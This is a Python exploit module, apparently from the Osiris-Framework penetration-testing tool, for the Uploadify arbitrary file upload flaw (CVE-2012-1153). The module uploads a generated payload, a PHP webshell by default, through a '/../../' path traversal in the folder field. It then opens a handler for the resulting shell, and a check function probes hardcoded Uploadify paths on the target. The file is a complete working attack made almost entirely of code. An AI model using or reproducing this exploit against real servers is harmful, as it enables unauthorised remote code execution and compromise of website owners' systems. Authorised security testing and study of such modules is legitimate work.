#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337

import  requests
from core.ModuleObtainer import obtainer
from core.Processor import processor
from core.generator.Generator import generator
from utilities.Tools import tools
from utilities.Messages import print_message
print_message.name_module = __file__

info = {
        'author'            :'Samir Sanchez Garnica, Carlos gomez',
        'date'              :'21/03/2019',
        'rank'              :'Excellent',
        'category'          :'Exploit',
        'path'              :'exploits/http/uploadify/uploadify_arbitrary_upload.py',
        'license'           :'GPL-2.0',
        'description'       :'This module exploits an error that allows the loading of arbitrary files and the remote execution of data (uploadify.php).',
        'references'        :['https://www.exploit-db.com/exploits/11614']
}
options = {
            'target'       :['Yes', 'set to target to attack',''],
            'uri'          :['Yes', 'set path URI library uploadify',''],
            'payload'      :['Yes', 'Set payload attack software','cmd/webshell/php_generic']
}

extra_info = {
        'cve'               :['CVE-2012-1153'],
        'targets'           :['Automatic']
}


required = {
        'start_required'     :'True',
        'check_required'     :'True'
}


def exploit():
    print_message.start_execution()
    __target = tools.http_or_https(obtainer.options['target'][2])

    if __target['code'] == 200:
        __payload_generate = generator.generator_payload(options_payload=obtainer.options_payload,
                                                         options_exploit=obtainer.options,
                                                         extra_info=extra_info)
        if __payload_generate['code'] == 200:
            __uri = obtainer.options['uri'][2]
            __file = {'Filedata': open(__payload_generate['message'], 'rb')}
            __value = {'folder': '/../../'}
            __url = obtainer.options['target'][2] + __uri

            __response = requests.post(__url, files=__file, data=__value)

            if __response.status_code == 200:
                print_message.execution_info("successful execution at {}".format(obtainer.options['target'][2]))
                processor.multi_handler(payload_options=obtainer.options_payload, exploit_options=obtainer.options)
            else:
                print_message.execution_error("Check if the endpoint is vulnerable")
    else:
        print_message.execution_error("The URL must be in the format http:// or https://")
        return False


def check():
    try:
        print_message.start_execution()
        __target = tools.http_or_https(obtainer.options['target'][2])

        if __target['code'] == 200:
            __paths = ["/docusevenet/librerias/uploadify_2_1_4/uploadify.php", "/docusevenet/libraries/uploadify_2_1_4/uploadify.php"]
            for __path in __paths:
                __response = requests.get(obtainer.options['target'][2] + __path)
                if __response.status_code != 404:
                    print_message.execution_info("Possible exploitation in {}".format(obtainer.options['target'][2] + __path))
        else:
            print_message.execution_error("The URL must be in the format http:// or https://")
            return False

        pass
    except Exception as Error:
        print(Error)

    print_message.end_execution()